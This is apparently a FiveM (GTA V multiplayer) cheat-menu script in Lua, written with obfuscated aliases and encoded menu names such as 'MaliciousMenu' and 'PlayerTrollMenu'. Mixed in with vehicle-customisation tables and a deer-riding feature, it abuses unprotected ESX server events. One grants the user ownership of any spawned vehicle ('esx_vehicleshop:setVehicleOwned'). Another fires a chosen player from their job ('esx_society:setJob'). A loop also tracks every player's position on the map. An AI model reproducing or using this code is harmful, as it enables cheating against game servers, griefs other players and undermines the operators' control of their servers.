


llll4874 = enabled
KAKAAKAKAK = llll4874


udwdj = TriggerServerEvent


Ggggg = GetHashKey


Plane = { } 
Plane.debug = false

jd366213 = false
KZjx = jd366213
ihrug = nil
WADUI = ihrug

local entityEnumerator = {
	__gc = function(enum)
		if enum.destructor and enum.handle then
			enum.destructor(enum.handle)
		end
		enum.destructor = WADUI
		enum.handle = WADUI
	end
}
wdihwaduaw = true
jejejejej = wdihwaduaw
xjbvxyg3e = jejejejej
waduyh487r64 = xjbvxyg3e


function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
		local iter, id = initFunc()
		if not id or id == 0 then
			disposeFunc(iter)
			return
		end
	
		local enum = {handle = iter, destructor = disposeFunc}
		setmetatable(enum, entityEnumerator)
	
		local next = waduyh487r64
		repeat
			coroutine.yield(id)
			next, id = moveFunc(iter)
		until not next
	
		enum.destructor, enum.handle = WADUI, WADUI
		disposeFunc(iter)
	end)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

function GetAllPeds()
    local peds123 = {}
    for ped in EnumeratePeds() do
        if DoesEntityExist(ped) then
            table.insert(peds123, ped)
        end
    end
    return peds123
end



  
local Deer = {
	Handle = nil,
	Invincible = false,
	Ragdoll = false,
	Marker = false,
	Speed = {
		Walk = 3.0,
		Run = 9.0,
	},
}

function GetNearbyPeds(X, Y, Z, Radius)
	local NearbyPeds = {}
	for Ped in EnumeratePeds() do
		if DoesEntityExist(Ped) then
			local PedPosition = GetEntityCoords(Ped, false)
			if Vdist(X, Y, Z, PedPosition.x, PedPosition.y, PedPosition.z) <= Radius then
				table.insert(NearbyPeds, Ped)
			end
		end
	end
	return NearbyPeds
end

function GetCoordsInfrontOfEntityWithDistance(Entity, Distance, Heading)
	local Coordinates = GetEntityCoords(Entity, false)
	local Head = (GetEntityHeading(Entity) + (Heading or 0.0)) * math.pi / 180.0
	return {x = Coordinates.x + Distance * math.sin(-1.0 * Head), y = Coordinates.y + Distance * math.cos(-1.0 * Head), z = Coordinates.z}
end

function GetGroundZ(X, Y, Z)
	if tonumber(X) and tonumber(Y) and tonumber(Z) then
		local _, GroundZ = GetGroundZFor_3dCoord(X + 0.0, Y + 0.0, Z + 0.0, Citizen.ReturnResultAnyway())
		return GroundZ
	else
		return 0.0
	end
end

function Deer.Destroy()
	local Ped = PlayerPedId()

	DetachEntity(Ped, true, false)
	ClearPedTasksImmediately(Ped)

	SetEntityAsNoLongerNeeded(Deer.Handle)
	DeletePed(Deer.Handle)

	if DoesEntityExist(Deer.Handle) then
		SetEntityCoords(Deer.Handle, 601.28948974609, -4396.9853515625, 384.98565673828)
	end

	Deer.Handle = nil
end

function Deer.Create()
	local Model = GetHashKey("a_c_deer")
	RequestModel(Model)
	while not HasModelLoaded(Model) do
		Citizen.Wait(50)
	end

	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)

	Deer.Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)

	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
	SetEntityInvincible(Deer.Handle, Deer.Invincible)

	SetModelAsNoLongerNeeded(Model)
end

function Deer.Attach()
	local Ped = PlayerPedId()

	FreezeEntityPosition(Deer.Handle, true)
	FreezeEntityPosition(Ped, true)

	local DeerPosition = GetEntityCoords(Deer.Handle, false)
	SetEntityCoords(Ped, DeerPosition.x, DeerPosition.y, DeerPosition.z)

	AttachEntityToEntity(Ped, Deer.Handle, GetPedBoneIndex(Deer.Handle, 24816), -0.3, 0.0, 0.3, 0.0, 0.0, 90.0, false, false, false, true, 2, true)

	TaskPlayAnim(Ped, "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, 0, 0, 0)

	FreezeEntityPosition(Deer.Handle, false)
	FreezeEntityPosition(Ped, false)
end

function Deer.Ride()
	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)
	if IsPedSittingInAnyVehicle(Ped) or IsPedGettingIntoAVehicle(Ped) then
		return
	end

	local AttachedEntity = GetEntityAttachedTo(Ped)

	if IsEntityAttached(Ped) and GetEntityModel(AttachedEntity) == GetHashKey("a_c_deer") then
		local SideCoordinates = GetCoordsInfrontOfEntityWithDistance(AttachedEntity, 1.0, 90.0)
		local SideHeading = GetEntityHeading(AttachedEntity)

		SideCoordinates.z = GetGroundZ(SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)

		Deer.Handle = nil
		DetachEntity(Ped, true, false)
		ClearPedTasksImmediately(Ped)

		SetEntityCoords(Ped, SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
		SetEntityHeading(Ped, SideHeading)
	else
		for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
			if GetEntityModel(Ped) == GetHashKey("a_c_deer") then
				Deer.Handle = Ped
				Deer.Attach()
				break
			end
		end
	end
end

Citizen.CreateThread(function()
	RequestAnimDict("rcmjosh2")
	while not HasAnimDictLoaded("rcmjosh2") do
		Citizen.Wait(250)
	end
	while true do
		Citizen.Wait(0)



		local Ped = PlayerPedId()
		local AttachedEntity = GetEntityAttachedTo(Ped)

		if (not IsPedSittingInAnyVehicle(Ped) or not IsPedGettingIntoAVehicle(Ped)) and IsEntityAttached(Ped) and AttachedEntity == Deer.Handle then
			if DoesEntityExist(Deer.Handle) then
				local LeftAxisXNormal, LeftAxisYNormal = GetControlNormal(2, 218), GetControlNormal(2, 219)
				local Speed, Range = Deer.Speed.Walk, 4000.0


				local GoToOffset = GetOffsetFromEntityInWorldCoords(Deer.Handle, LeftAxisXNormal * Range, LeftAxisYNormal * -1.0 * Range, 0.0)

				TaskLookAtCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 2)
				TaskGoStraightToCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, Speed, 20000, 40000.0, 0.5)

				if Deer.Marker then
					DrawMarker(6, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 0, 0, 0, 0, 1.0, 1.0, 1.0, 255, 255, 255, 255, 0, 0, 2, 0, 0, 0, 0)
				end
			end
		end
	end
end)



local WODJAWUE = waduyh487r64

local states = {}
states.frozen = KZjx
states.frozenPos = WADUI
kkkk = "iSeek"
local planeisbest = KZjx
local dEI = kkkk


local ojtgh = "50.0"
local a = 1

local cg = waduyh487r64
local ch = KZjx
local ci = waduyh487r64
local chdata = {}
	function mysplit(inputstr, sep)
		if sep == WADUI then
			sep = "%s"
		end
		local t={} ; i=1
		for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
			t[i] = str
			i = i + 1
		end
		return t
	end

	local allMenus = { "\77\97\105\110\77\101\110\117\10", "\83\101\108\102\77\101\110\117\10", "\79\110\108\105\110\101\80\108\97\121\101\114\115\77\101\110\117\10", "\87\101\97\112\111\110\77\101\110\117\10", "\83\105\110\103\108\101\10\87\101\97\112\111\110\77\101\110\117\10", "\77\97\108\105\99\105\111\117\115\77\101\110\117\10",
                            "\69\83\88\77\101\110\117\10", "\69\83\88\74\111\98\77\101\110\117\10", "\69\83\88\77\111\110\101\121\77\101\110\117\10", "\86\101\104\77\101\110\117\10", "\86\101\104\83\112\97\119\110\79\112\116\10", "\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10",
                            "\84\101\108\101\112\111\114\116\77\101\110\117\10", "\76\83\67\10", "\72\101\100\105\116\10", "\80\108\97\121\101\114\84\114\111\108\108\77\101\110\117\10", "\80\108\97\121\101\114\10\69\83\88\77\101\110\117\10", "\80\108\97\121\101\114\10\69\83\88\74\111\98\77\101\110\117\10",
                            "\80\108\97\121\101\114\69\83\88\84\114\105\103\103\101\114\77\101\110\117\10", "\66\117\108\108\101\116\71\117\110\77\101\110\117\10", "\84\114\111\108\108\77\101\110\117\10", "\87\101\97\112\111\110\67\117\115\116\111\109\105\122\97\116\105\111\110\10", "\87\101\97\112\111\110\84\105\110\116\77\101\110\117\10",
                            "\86\101\104\105\99\108\101\82\97\109\77\101\110\117\10", "\69\83\88\66\111\115\115\77\101\110\117\10", "\83\112\97\119\110\80\114\111\112\115\77\101\110\117\10", "\83\105\110\103\108\101\10\87\101\112\80\108\97\121\101\114\10", "\86\101\104\66\111\111\115\116\77\101\110\117\10",
                            "\69\83\88\77\105\115\99\77\101\110\117\10", "\69\83\88\68\114\117\103\77\101\110\117\10", "\65\73\10", "\83\101\116\116\105\110\103\115\77\101\110\117\10", "\86\82\80\77\101\110\117\10"}
	
local handlingData = {
	"handlingName",
	"fMass",
	"fInitialDragCoeff",
	"fPercentSubmerged",
	"vecCentreOfMassOffset",
	"vecInertiaMultiplier",
	"fDriveBiasFront",
	"nInitialDriveGears",
	"fInitialDriveForce",
	"fDriveInertia",
	"fClutchChangeRateScaleUpShift",
	"fClutchChangeRateScaleDownShift",
	"fInitialDriveMaxFlatVel",
	"fBrakeForce",
	"fBrakeBiasFront",
	"fHandBrakeForce",
	"fSteeringLock",
	"fTractionCurveMax",
	"fTractionCurveMin",
	"fTractionCurveLateral",
	"fTractionSpringDeltaMax",
	"fLowSpeedTractionLossMult",
	"fCamberStiffnesss",
	"fTractionBiasFront",
	"fTractionLossMult",
	"fSuspensionForce",
	"fSuspensionCompDamp",
	"fSuspensionReboundDamp",
	"fSuspensionUpperLimit",
	"fSuspensionLowerLimit",
	"fSuspensionRaise",
	"fSuspensionBiasFront",
	"fTractionCurveMax",
	"fAntiRollBarForce",
	"fAntiRollBarBiasFront",
	"fRollCentreHeightFront",
	"fRollCentreHeightRear",
	"fCollisionDamageMult",
	"fWeaponDamageMult",
	"fDeformationDamageMult",
	"fEngineDamageMult",
	"fPetrolTankVolume",
	"fOilVolume",
	"fSeatOffsetDistX",
	"fSeatOffsetDistY",
	"fSeatOffsetDistZ",
	"nMonetaryValue",
	"strModelFlags",
	"strHandlingFlags",
	"strDamageFlags",
	"\65\73\10Handling",
	
	
	"fThrust",
	"fThrustFallOff",
	"fThrustVectoring",
	"fYawMult",
	"fYawStabilise",
	"fSideSlipMult",
	"fRollMult",
	"fRollStabilise",
	"fPitchMult",
	"fPitchStabilise",
	"fFormLiftMult",
	"fAttackLiftMult",
	"fAttackDiveMult",
	"fGearDownDragV",
	"fGearDownLiftMult",
	"fWindMult",
	"fMoveRes",
	"vecTurnRes",
	"vecSpeedRes",
	"fGearDoorFrontOpen",
	"fGearDoorRearOpen",
	"fGearDoorRearOpen2",
	"fGearDoorRearMOpen",
	"fTurublenceMagnitudeMax",
	"fTurublenceForceMulti",
	"fTurublenceRollTorqueMulti",
	"fTurublencePitchTorqueMulti",
	"fBodyDamageControlEffectMult",
	"fInputSensitivityForDifficulty",
	"fOnGroundYawBoostSpeedPeak",
	"fOnGroundYawBoostSpeedCap",
	"fEngineOffGlideMulti",
	"handlingType",
	"fThrustFallOff",
	"fThrustFallOff",
	
	
	"fBackEndPopUpCarImpulseMult",
	"fBackEndPopUpBuildingImpulseMult",
	"fBackEndPopUpMaxDeltaSpeed",
	
	

	
	"fLeanFwdCOMMult",
	"fLeanFwdForceMult",
	"fLeanBakCOMMult",
	"fLeanBakForceMult",
	"fMaxBankAngle",
	"fFullAnimAngle",
	"fDesLeanReturnFrac",
	"fStickLeanMult",
	"fBrakingStabilityMult",
	"fInAirSteerMult",
	"fWheelieBalancePoint",
	"fStoppieBalancePoint",
	"fWheelieSteerMult",
	"fRearBalanceMult",
	"fFrontBalanceMult",
	"fBikeGroundSideFrictionMult",
	"fBikeWheelGroundSideFrictionMult",
	"fBikeOnStandLeanAngle",
	"fBikeOnStandSteerAngle",
	"fJumpForce",
}



Citizen.CreateThread(function()

	function SetVehicleHandlingData(Vehicle,Data,Value) 
		if DoesEntityExist(Vehicle) and Data and Value then
			for theKey,property in pairs(handlingData) do 
				if property == Data then
					local intfind = string.find(property, "n" ) 
					local floatfind = string.find(property, "f" )
					local strfind = string.find(property, "str" )
					local vecfind = string.find(property, "vec" )
					
					
					if intfind ~= WADUI and intfind == 1 then
						SetVehicleHandlingInt( Vehicle, "CHandlingData", Data, tonumber(Value) ) 
					elseif floatfind ~= WADUI and floatfind == 1 then
						local Value = tonumber(Value)+.0
						SetVehicleHandlingFloat( Vehicle, "CHandlingData", Data, tonumber(Value) )
					elseif strfind ~= WADUI and strfind == 1 then
						SetVehicleHandlingField( Vehicle, "CHandlingData", Data, Value )
					elseif vecfind ~= WADUI and vecfind == 1 then
						SetVehicleHandlingVector( Vehicle, "CHandlingData", Data, Value )
					else
						SetVehicleHandlingField( Vehicle, "CHandlingData", Data, Value )
					end
				end
			end
		end
	end
	
	
	function GetVehicleHandlingData(Vehicle,Data)
		if DoesEntityExist(Vehicle) then
			for theKey,property in pairs(handlingData) do 
				if property == Data then
					local intfind = string.find(property, "n" )
					local floatfind = string.find(property, "f" )
					local strfind = string.find(property, "str" )
					local vecfind = string.find(property, "vec" )
					
					if intfind ~= WADUI and intfind == 1 then
						return GetVehicleHandlingInt( Vehicle, "CHandlingData", Data )
					elseif floatfind ~= WADUI and floatfind == 1 then
						return GetVehicleHandlingFloat( Vehicle, "CHandlingData", Data )
					elseif vecfind ~= WADUI and vecfind == 1 then
						return GetVehicleHandlingVector( Vehicle, "CHandlingData", Data )
					else
						return KZjx
					end
				end
			end
		end
	end
	
	function GetAllVehicleHandlingData(Vehicle)
		local VehicleHandlingData = {}
		if DoesEntityExist(Vehicle) then
			for i,theData in pairs(handlingData) do 
				local intfind = string.find(theData, "n" )
				local floatfind = string.find(theData, "f" )
				local strfind = string.find(theData, "str" )
				local vecfind = string.find(theData, "vec" )
				
				if intfind ~= WADUI and intfind == 1 and GetVehicleHandlingInt( Vehicle, "CHandlingData", theData ) then
					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingInt( Vehicle, "CHandlingData", theData ), type = "int" }  )
				elseif floatfind ~= WADUI and floatfind == 1 and GetVehicleHandlingFloat( Vehicle, "CHandlingData", theData ) then
					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingFloat( Vehicle, "CHandlingData", theData ), type = "float" } )
				elseif vecfind ~= WADUI and vecfind == 1 and GetVehicleHandlingVector( Vehicle, "CHandlingData", theData ) then
					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingVector( Vehicle, "CHandlingData", theData ), type = "vector3" } )
				end
			end
			return VehicleHandlingData
		end
	end
	
		
	
	
end
)

Citizen.CreateThread(function()
	while waduyh487r64 do
		Citizen.Wait(10)
		if(states.frozen)then
			ClearPedTasksImmediately(GetPlayerPed(-1))
			SetEntityCoords(GetPlayerPed(-1), states.frozenPos)
		end
	end
end)

Citizen.CreateThread(
    function()
        while waduyh487r64 do
            Wait(1)
            for i = 0, 128 do
                if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
                   local ped = GetPlayerPed(i)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), waduyh487r64))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), waduyh487r64))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, waduyh487r64))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(i), KZjx, KZjx, '', KZjx)
                    wantedLvl = GetPlayerWantedLevel(i)
                    if ch then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, waduyh487r64)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, waduyh487r64)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, KZjx)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, KZjx)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, KZjx)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, KZjx)
                    end
                    if cg then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, waduyh487r64)
                            SetBlipNameToPlayerName(blip, i)
                        else
                            vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsIn(ped, KZjx)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                    SetBlipNameToPlayerName(blip, i)
                                end
                            elseif vvvvvvvvvvvvvvvvvvvvvvvv then
                                vehClass = GetVehicleClass(vvvvvvvvvvvvvvvvvvvvvvvv)
                                vehModel = GetEntityModel(vvvvvvvvvvvvvvvvvvvvvvvv)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                        SetBlipNameToPlayerName(blip, i)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == Ggggg('besra') or vehModel == Ggggg('hydra') or
                                            vehModel == Ggggg('lazer')
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                            SetBlipNameToPlayerName(blip, i)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                    end
                                elseif
                                    vehModel == Ggggg('insurgent') or vehModel == Ggggg('insurgent2') or
                                        vehModel == Ggggg('limo2')
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                        SetBlipNameToPlayerName(blip, i)
                                    end
                                elseif vehModel == Ggggg('rhino') then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                        SetBlipNameToPlayerName(blip, i)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, waduyh487r64)
                                    SetBlipNameToPlayerName(blip, i)
                                end
                                passengers = GetVehicleNumberOfPassengers(vvvvvvvvvvvvvvvvvvvvvvvv)
                                if passengers then
                                    if not IsVehicleSeatFree(vvvvvvvvvvvvvvvvvvvvvvvv, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, waduyh487r64)
                                    SetBlipNameToPlayerName(blip, i)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(vvvvvvvvvvvvvvvvvvvvvvvv)))
                            SetBlipNameToPlayerName(blip, i)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), waduyh487r64))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(i), waduyh487r64))
                                distance =
                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)

local function fv()
    local cb = pikgfrihfg('Enter Vehicle Spawn Name', '', 100)
    local cw = pikgfrihfg('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local vvvvvvvvvvvvvvvvvvvvvvvv =
            CreateVehicle(
            Ggggg(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            waduyh487r64,
            waduyh487r64
        )
        SetVehicleNumberPlateText(vvvvvvvvvvvvvvvvvvvvvvvv, cw)
        local cx = ESX.Game.GetVehicleProperties(vvvvvvvvvvvvvvvvvvvvvvvv)
        udwdj('esx_vehicleshop:setVehicleOwned', cx)
        av('~g~~h~Success', KZjx)
    else
        av('~b~~h~Model is not valid!', waduyh487r64)
    end
end

local function e()
    local name = GetPlayerName(PlayerId())
end
local o = {}
local h = KZjx
rot = 1
local j = KZjx
local bw = waduyh487r64
local b8 = KZjx
local b9 = KZjx
local ba = KZjx
local bb = KZjx
local bc = WADUI
local bd = {
        {
            name = "Spoilers", id = 0
        }, {
            name = "Front Bumper", id = 1
        }, {
            name = "Rear Bumper", id = 2
        }, {
            name = "Side Skirt", id = 3
        }, {
            name = "Exhaust", id = 4
        }, {
            name = "Frame", id = 5
        }, {
            name = "Grille", id = 6
        }, {
            name = "Hood", id = 7
        }, {
            name = "Fender", id = 8
        }, {
            name = "Right Fender", id = 9
        }, {
            name = "Roof", id = 10
        }, {
            name = "Vanity Plates", id = 25
        }, {
            name = "Trim", id = 27
        }, {
            name = "Ornaments", id = 28
        }, {
            name = "Dashboard", id = 29
        }, {
            name = "Dial", id = 30
        }, {
            name = "Door Speaker", id = 31
        }, {
            name = "Seats", id = 32
        }, {
            name = "Steering Wheel", id = 33
        }, {
            name = "Shifter Leavers", id = 34
        }, {
            name = "Plaques", id = 35
        }, {
            name = "Speakers", id = 36
        }, {
            name = "Trunk", id = 37
        }, {
            name = "Hydraulics", id = 38
        }, {
            name = "Engine Block", id = 39
        }, {
            name = "Air Filter", id = 40
        }, {
            name = "Struts", id = 41
        }, {
            name = "Arch Cover", id = 42
        }, {
            name = "Aerials", id = 43
        }, {
            name = "Trim 2", id = 44
        }, {
            name = "Tank", id = 45
        }, {
            name = "Windows", id = 46
        }, {
            name = "Livery", id = 48
        }, {
            name = "Wheels", id = 23
        }, {
            name = "Wheel Types", id = "wheeltypes"
        }, {
            name = "Extras", id = "extra"
        }, {
            name = "Neons", id = "neon"
        }, {
            name = "Paint", id = "paint"
        }, {
            name = "Headlights Color", id = "headlight"
        },  {
            name = "Licence Plate", id = "licence"                           
        }
    }
    
    local be = {
        {
            name = "Engine", id = 11
        }, {
            name = "Brakes", id = 12
        }, {
            name = "Transmission", id = 13
        }, {
            name = "Suspension", id = 15
        }
    }
    
    local bo = {
        {
            name = "Default", id = -1
        }, {
            name = "White", id = 0
        }, {
            name = "Blue", id = 1
        }, {
            name = "Electric Blue", id = 2
        }, {
            name = "Mint Green", id = 3
        }, {
            name = "Lime Green", id = 4
        }, {
            name = "Yellow", id = 5
        }, {
            name = "Golden Shower", id = 6
        }, {
            name = "Orange", id = 7
        }, {
            name = "Red", id = 8
        }, {
            name = "Pony Pink", id = 9
        }, {
            name = "Hot Pink", id = 10
        }, {
            name = "Purple", id = 11
        }, {
            name = "Blacklight", id = 12
        }
    }
    
    local colors = {
        ["White"] = {
            255, 255, 255
        }, ["Blue"] = {
            0, 0, 255
        }, ["Electric Blue"] = {
            0, 150, 255
        }, ["Mint Green"] = {
            50, 255, 155
        }, ["Lime Green"] = {
            0, 255, 0
        }, ["Yellow"] = {
            255, 255, 0
        }, ["Golden Shower"] = {
            204, 204, 0
        }, ["Orange"] = {
            255, 128, 0
        }, ["Red"] = {
            255, 0, 0
        }, ["Pony Pink"] = {
            255, 102, 255
        }, ["Hot Pink"] = {
            255, 0, 255
        }, ["Purple"] = {
            153, 0, 153
        }
    }
    
	-- 4x482
	
    local bg = {
        {
            name = "Black", id = 0
        }, {
            name = "Carbon Black", id = 147
        }, {
            name = "Graphite", id = 1
        }, {
            name = "Anhracite Black", id = 11
        }, {
            name = "Black Steel", id = 2
        }, {
            name = "Dark Steel", id = 3
        }, {
            name = "Silver", id = 4
        }, {
            name = "Bluish Silver", id = 5
        }, {
            name = "Rolled Steel", id = 6
        }, {
            name = "Shadow Silver", id = 7
        }, {
            name = "Stone Silver", id = 8
        }, {
            name = "Midnight Silver", id = 9
        }, {
            name = "Cast Iron Silver", id = 10
        }, {
            name = "Red", id = 27
        }, {
            name = "Torino Red", id = 28
        }, {
            name = "Formula Red", id = 29
        }, {
            name = "Lava Red", id = 150
        }, {
            name = "Blaze Red", id = 30
        }, {
            name = "Grace Red", id = 31
        }, {
            name = "Garnet Red", id = 32
        }, {
            name = "Sunset Red", id = 33
        }, {
            name = "Cabernet Red", id = 34
        }, {
            name = "Wine Red", id = 143
        }, {
            name = "Candy Red", id = 35
        }, {
            name = "Hot Pink", id = 135
        }, {
            name = "Pfsiter Pink", id = 137
        }, {
            name = "Salmon Pink", id = 136
        }, {
            name = "Sunrise Orange", id = 36
        }, {
            name = "Orange", id = 38
        }, {
            name = "Bright Orange", id = 138
        }, {
            name = "Gold", id = 99
        }, {
            name = "Bronze", id = 90
        }, {
            name = "Yellow", id = 88
        }, {
            name = "Race Yellow", id = 89
        }, {
            name = "Dew Yellow", id = 91
        }, {
            name = "Dark Green", id = 49
        }, {
            name = "Racing Green", id = 50
        }, {
            name = "Sea Green", id = 51
        }, {
            name = "Olive Green", id = 52
        }, {
            name = "Bright Green", id = 53
        }, {
            name = "Gasoline Green", id = 54
        }, {
            name = "Lime Green", id = 92
        }, {
            name = "Midnight Blue", id = 141
        }, {
            name = "Galaxy Blue", id = 61
        }, {
            name = "Dark Blue", id = 62
        }, {
            name = "Saxon Blue", id = 63
        }, {
            name = "Blue", id = 64
        }, {
            name = "Mariner Blue", id = 65
        }, {
            name = "Harbor Blue", id = 66
        }, {
            name = "Diamond Blue", id = 67
        }, {
            name = "Surf Blue", id = 68
        }, {
            name = "Nautical Blue", id = 69
        }, {
            name = "Racing Blue", id = 73
        }, {
            name = "Ultra Blue", id = 70
        }, {
            name = "Light Blue", id = 74
        }, {
            name = "Chocolate Brown", id = 96
        }, {
            name = "Bison Brown", id = 101
        }, {
            name = "Creeen Brown", id = 95
        }, {
            name = "Feltzer Brown", id = 94
        }, {
            name = "Maple Brown", id = 97
        }, {
            name = "Beechwood Brown", id = 103
        }, {
            name = "Sienna Brown", id = 104
        }, {
            name = "Saddle Brown", id = 98
        }, {
            name = "Moss Brown", id = 100
        }, {
            name = "Woodbeech Brown", id = 102
        }, {
            name = "Straw Brown", id = 99
        }, {
            name = "Sandy Brown", id = 105
        }, {
            name = "Bleached Brown", id = 106
        }, {
            name = "Schafter Purple", id = 71
        }, {
            name = "Spinnaker Purple", id = 72
        }, {
            name = "Midnight Purple", id = 142
        }, {
            name = "Bright Purple", id = 145
        }, {
            name = "Cream", id = 107
        }, {
            name = "Ice White", id = 111
        }, {
            name = "Frost White", id = 112
        }
    }
    
    local bi = {
        {
            name = "Black", id = 12
        }, {
            name = "Gray", id = 13
        }, {
            name = "Light Gray", id = 14
        }, {
            name = "Ice White", id = 131
        }, {
            name = "Blue", id = 83
        }, {
            name = "Dark Blue", id = 82
        }, {
            name = "Midnight Blue", id = 84
        }, {
            name = "Midnight Purple", id = 149
        }, {
            name = "Schafter Purple", id = 148
        }, {
            name = "Red", id = 39
        }, {
            name = "Dark Red", id = 40
        }, {
            name = "Orange", id = 41
        }, {
            name = "Yellow", id = 42
        }, {
            name = "Lime Green", id = 55
        }, {
            name = "Green", id = 128
        }, {
            name = "Forest Green", id = 151
        }, {
            name = "Foliage Green", id = 155
        }, {
            name = "Olive Darb", id = 152
        }, {
            name = "Dark Earth", id = 153
        }, {
            name = "Desert Tan", id = 154
        }
    }
    
    local bj = {
        {
            name = "Brushed Steel", id = 117
        }, {
            name = "Brushed Black Steel", id = 118
        }, {
            name = "Brushed Aluminum", id = 119
        }, {
            name = "Pure Gold", id = 158
        }, {
            name = "Brushed Gold", id = 159
        }
    }
local bk = KZjx


local function k(l)
    local m = {}
    local n = GetGameTimer() / 200
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end


function checkValidVehicleExtras()
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, KZjx)
    local az = {}
    for i = 0, 50, 1 do
        if DoesExtraExist(ay, i) then
            local aA = '~h~Extra #' .. tostring(i)
            local I = 'OFF'
            if IsVehicleExtraTurnedOn(ay, i) then
                I = 'ON'
            end
            local aB = '~h~extra ' .. tostring(i)
            table.insert(
                az,
                {
                    menuName = realModName,
                    data = {
                        ['action'] = realSpawnName,
                        ['state'] = I
                    }
                }
            )
        end
    end
    return az
end

function FirePlayer(SelectedPlayer)
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			local playerMatch = WADUI
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(SelectedPlayer) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback('esx_society:setJob', function()
			end, playerMatch, 'unemployed', 0, 'hire')

		end)
	end
end

